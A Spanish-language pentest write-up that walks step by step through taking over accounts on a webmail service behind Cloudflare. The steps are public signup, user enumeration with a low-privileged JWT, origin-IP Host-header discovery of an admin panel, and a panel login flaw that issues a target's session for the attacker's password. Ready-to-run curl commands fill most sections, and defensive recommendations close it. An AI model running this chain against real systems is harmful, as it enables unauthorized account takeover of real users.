Hay ataques que no empiezan con un payload ruidoso. No hay SQLi, no hay XSS, no hay RCE, no hay bypass mágico de Cloudflare. Solo hay algo más peligroso: flujos legítimos mal conectados entre sí. Este chain describe una toma de cuenta completa desde una posición externa. La idea no fue romper Cloudflare, sino caminar por la aplicación como si fuéramos un usuario normal, hasta encontrar el punto donde el backend confundía identidad, sesión y autorización.

El patrón para este ejemplo es:

```text
registro público
    ↓
cuenta propia low-privileged
    ↓
JWT válido
    ↓
Backend discovery 
    ↓
descubrimiento de panel/backend
    ↓
login logic flaw / IDOR
```

## 1. Open registration

Todo empieza con una pregunta simple:

¿Puedo crear una identidad válida dentro del ecosistema?

Un signup público no es malo por sí mismo. El problema aparece cuando ese signup no crea una cuenta aislada o pendiente, sino una identidad funcional dentro del mismo dominio donde viven usuarios reales.

```bash
# Variables generales del entorno autorizado
BASE_URL="https://example.test"
SIGNUP_PATH="/path/to/sign-up"
SIGNUP_COOKIE="/tmp/signup_cookies.txt"

ATTACKER_USER="testuser123"
ATTACKER_PASS="Password123x"
```

```bash
# Capturar CSRF si el formulario lo requiere
# Muchos formularios modernos usan tokens anti-CSRF; si no existe, este paso no aplica
CSRF=$(curl -sk -c "$SIGNUP_COOKIE" "$BASE_URL$SIGNUP_PATH" | grep -oP '(?<=_token\]" value=")[^"]+')
```

```bash
# Crear una cuenta propia low-privileged mediante el signup público
curl -sk -b "$SIGNUP_COOKIE" -X POST "$BASE_URL$SIGNUP_PATH" -d "signup[firstname]=Test&signup[username]=$ATTACKER_USER&signup[password][first]=$ATTACKER_PASS&signup[password][second]=$ATTACKER_PASS&signup[_token]=$CSRF"
```

El atacante no tiene credenciales previas, pero convierte un formulario público en una identidad interna. Cloudflare puede ver un signup legítimo, pero no sabe si esa cuenta debería existir dentro del dominio. Esa decisión pertenece al backend

## 2. Cuenta propia low-privileged

Aquí está el punto clave es que no saltamos mágicamente al dominio. El salto ocurre porque la cuenta recién creada pertenece al mismo namespace, dominio o tenant que los usuarios reales. Cuando esa cuenta inicia sesión, el backend le entrega una sesión o JWT válido. Desde ese momento, el atacante ya no opera como anónimo, sino como usuario low-privileged interno.

```bash
WEBMAIL_URL="https://webmail.example.test"
ATTACKER_EMAIL="$ATTACKER_USER@example.test"
```

```bash
# Login con la cuenta propia y obtención de JWT
TOKEN=$(curl -sk -X POST "$WEBMAIL_URL/api/auth/login" -H "Content-Type: application/json" -d "{\"email\":\"$ATTACKER_EMAIL\",\"password\":\"$ATTACKER_PASS\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))")
```

```bash
# Confirmar que se obtuvo un token funcional
echo "$TOKEN"
```

El foothold deja de ser “una simple cuenta creada” y se convierte en una credencial válida dentro del ecosistema. Lo peligroso no es solo que exista un registro público, sino que una cuenta recién creada pueda consumir APIs internas, consultar directorios del tenant y acceder a flujos pensados para usuarios ya confiables. Simple, pero poderoso.

## 3. JWT válido — User enumeration

Con el JWT en mano, la siguiente pregunta es:

¿Qué puede ver una cuenta low-privileged dentro del dominio?

La enumeración puede ocurrir por signup, mensajes de login, contactos, calendarios, directorios internos o endpoints de autocomplete

```bash
# Probar si el signup revela usuarios existentes por diferencias de respuesta
curl -sk -b "$SIGNUP_COOKIE" -X POST "$BASE_URL$SIGNUP_PATH" -d "signup[firstname]=Test&signup[username]=knownuser&signup[password][first]=$ATTACKER_PASS&signup[password][second]=$ATTACKER_PASS&signup[_token]=$CSRF" | grep -i "taken\|already\|exist\|invalid\|error\|redirect"

# Enumerar usuarios reales del dominio usando el JWT low-privileged
curl -sk "$WEBMAIL_URL/api/contacts/searchshare?search=" -H "x-access-token: $TOKEN" | python3 -m json.tool

# Buscar metadata de un usuario target concreto
TARGET_EMAIL="target@example.test"
curl -sk "$WEBMAIL_URL/api/contacts/searchshare?search=$TARGET_EMAIL" -H "x-access-token: $TOKEN" | python3 -m json.tool
```

Una cuenta recién creada se convierte en visibilidad interna: usuarios, nombres, correos, metadata y posibles targets. Cloudflare puede ver volumen, IP, ASN o User-Agent, pero no puede decidir si esa cuenta debe consultar el directorio interno. Eso es autorización backend.

## 4. Backend discovery — encontrar el sistema que gobierna las cuentas

Igual que en entornos Entra ID/Azure, cuando ya identificas un usuario objetivo, el siguiente movimiento no es atacar a ciegas, sino entender qué sistema gobierna esa identidad. En aplicaciones de correo, SaaS internos o plataformas multi-tenant, es común que el frontend visible no sea quien realmente administra las cuentas. Puede existir un panel secundario, una API administrativa, un backend de provisioning, un sistema de delegación o una integración interna encargada de crear usuarios, resetear contraseñas o modificar permisos.

A veces la propia aplicación deja migas de pan: un nombre interno en un error, una API backend, una ruta administrativa, un dominio secundario, un virtual host o una integración mal expuesta. Un error mal manejado puede convertirse en la brújula que te lleva del frontend visible al sistema que realmente administra las cuentas.

```bash
# Probar un endpoint sensible que pueda revelar nombres internos o integraciones backend
curl -sk -X POST "$WEBMAIL_URL/api/auth/reset_delegate_pwd" -H "x-access-token: $TOKEN" -H "Content-Type: application/json" -d "{\"email\":\"$TARGET_EMAIL\"}" | python3 -m json.tool
```

Si aparece una referencia a un backend, panel, API interna o sistema de administración, el siguiente paso es validar si ese componente está expuesto. En muchos entornos, un panel puede no estar enlazado desde la web principal, pero aun así responder mediante un dominio secundario, un virtual host o una IP directa.

```bash
DIRECT_IP="https://1.2.3.4"
PANEL_HOST="panel.example.test"
```

```bash
# Probar si un virtual host del panel responde sobre la IP directa
curl -sk "$DIRECT_IP" -H "Host: $PANEL_HOST" -I
```

```bash
# Confirmar si el HTML corresponde al panel esperado
curl -sk "$DIRECT_IP" -H "Host: $PANEL_HOST" | head -50
```

El objetivo es descubrir si detrás del webmail existe un sistema de administración más privilegiado. Si ese panel está expuesto y acepta cuentas del mismo ecosistema, puede convertirse en el verdadero punto crítico del chain. Cloudflare no reemplaza el hardening del origen. Si el backend responde por IP directa, virtual host o panel secundario expuesto, la aplicación puede quedar accesible fuera del flujo esperado. Los paneles internos deberían estar detrás de VPN, Zero Trust, allowlists o redes privadas.

## 5. Panel API mapping

Antes de probar el panel, conviene asumir que puede estar construido como una SPA y que parte de su lógica viva en archivos JavaScript públicos. Esto es común en paneles modernos: el HTML inicial carga un bundle grande y ese bundle contiene rutas, endpoints, nombres de eventos, base URLs, validaciones cliente y a veces nombres de campos esperados por la API.

> Una SPA, o Single Page Application, es una aplicación web donde el navegador carga una página principal y luego usa JavaScript para renderizar vistas, llamar APIs y manejar rutas internas sin recargar toda la página. En pentest, revisar sus bundles JS puede revelar endpoints, rutas ocultas, base URLs y flujos internos.

Con el panel localizado, el siguiente paso no es adivinar: es leer el frontend. Muchas veces el propio JavaScript del panel te dice cómo habla con el backend.

```bash
PANEL_JS="panel_bundle.js"
```

```bash
# Descargar el bundle JavaScript del panel
curl -sk "$DIRECT_IP/dist/bundle.production.js" -H "Host: $PANEL_HOST" -o "$PANEL_JS"

# Buscar rutas relacionadas con login, sesión o autenticación
grep -oE '"/[^"]{1,80}"' "$PANEL_JS" | grep -iE "login|session|auth|sign" | sort -u

# Buscar la base URL usada por la API del panel
grep -oE 'baseURL[^,;]+' "$PANEL_JS" | head -10
```

Después de identificar una ruta candidata, un request mal formado puede ayudar a descubrir qué campos espera realmente la API. Esto no explota nada por sí solo; simplemente aprovecha errores de validación demasiado descriptivos.

```bash
# Enviar un login mal formado para observar campos esperados por la API
curl -sk -X POST "$DIRECT_IP/api/users/login" -H "Host: $PANEL_HOST" -H "Content-Type: application/json" -d "{\"user\":{\"email\":\"$ATTACKER_EMAIL\",\"password\":\"$ATTACKER_PASS\"}}"
```

El frontend se vuelve documentación operativa del panel. Si el bundle revela rutas y el backend devuelve errores descriptivos, puedes reconstruir el flujo real de autenticación sin necesidad de adivinar, ocultar rutas en JavaScript no es seguridad. Toda ruta expuesta al frontend debe asumirse pública. La protección real debe estar en validación server-side, autorización, control de sesión, hardening del panel y respuestas de error mínimas.

## 6. Critical flaw — Panel Login IDOR / Authentication logic flaw

Esta es la fase crítica.

Primero se valida que la cuenta propia puede iniciar sesión en el panel. Luego se cambia solo el campo de identidad hacia el target, manteniendo la password propia.

```bash
PANEL_HEADERS="/tmp/panel_headers.txt"
TARGET_PANEL_HEADERS="/tmp/target_panel_headers.txt"
```

```bash
# Login legítimo al panel con la cuenta propia
curl -sk -X POST "$DIRECT_IP/api/users/login" -H "Host: $PANEL_HOST" -H "Content-Type: application/json" -d "{\"email_address\":\"$ATTACKER_EMAIL\",\"password\":\"$ATTACKER_PASS\"}" -D "$PANEL_HEADERS" -o /tmp/panel_login_body.json

# Probar login IDOR: cambiar solo email_address al target, manteniendo la password propia
curl -sk -X POST "$DIRECT_IP/api/users/login" -H "Host: $PANEL_HOST" -H "Content-Type: application/json" -d "{\"email_address\":\"$TARGET_EMAIL\",\"password\":\"$ATTACKER_PASS\"}" -D "$TARGET_PANEL_HEADERS" -o /tmp/target_panel_login_body.json

# Extraer session_token emitido para el target
TARGET_PANEL_TOKEN=$(grep -i '^set-cookie: session_token=' "$TARGET_PANEL_HEADERS" | sed -E 's/.*session_token=([^;]+).*/\1/I')

# Validar que el token representa una sesión del target
curl -sk "$DIRECT_IP/api/users/me" -H "Host: $PANEL_HOST" -H "Cookie: session_token=$TARGET_PANEL_TOKEN" | python3 -m json.tool
```

La lógica vulnerable es brutalmente simple:

```text
email_address = target
password      = password de mi cuenta

resultado:
session_token = sesión del target
```

Una credencial propia low-privileged se convierte en sesión de otro usuario.

## Why Cloudflare did not stop it

Cloudflare no falló como WAF. Simplemente el ataque no dependía de payloads bloqueables.

La cadena usó acciones normales:

```text
signup legítimo
login legítimo
consulta API autenticada
descarga de JavaScript público
Host header hacia panel expuesto
login JSON válido
cambio de password autenticado
login webmail válido
```

El fallo real fue de identidad:

```text
cuenta propia low-privileged
        ↓
session_token del target
        ↓
password change del target
        ↓
JWT del target
```

## Defensive takeaways

Cloudflare debe tratarse como una capa de seguridad, no como el límite de autorización. Una IP, un WAF o un proxy no salvan una mala decisión de identidad. En este caso, el ataque no rompió la puerta: usó la puerta correcta, con una tarjeta mal emitida. Controles recomendados:

```text
1. Validar que la password pertenece exactamente a la identidad solicitada.
2. Nunca emitir sesión para una cuenta distinta a la credencial verificada.
3. Restringir paneles backend con Zero Trust, VPN, allowlist o red interna.
4. Bloquear acceso directo al origen; permitir solo tráfico del reverse proxy esperado.
5. Aplicar rate limiting en signup, login, contact search y password change.
6. Usar errores uniformes para evitar enumeración.
7. Evitar que usuarios low-privileged enumeren directorios internos.
8. Alertar cuando una cuenta recién creada consulta muchos usuarios.
9. Alertar cuando login identity y session identity no coinciden.
10. Revisar APIs expuestas al frontend y eliminar metadata excesiva.
```

Una capa perimetral puede ayudar con rate limiting, bot detection, WAF rules, Access policies y protección de origen. Pero no puede sustituir preguntas que solo debe responder el backend:

```text
¿Esta cuenta debería existir?
¿Este usuario puede ver este directorio?
¿Esta password pertenece exactamente a este email_address?
¿Este session_token fue emitido para la identidad correcta?
¿Este panel debería estar expuesto públicamente?
```
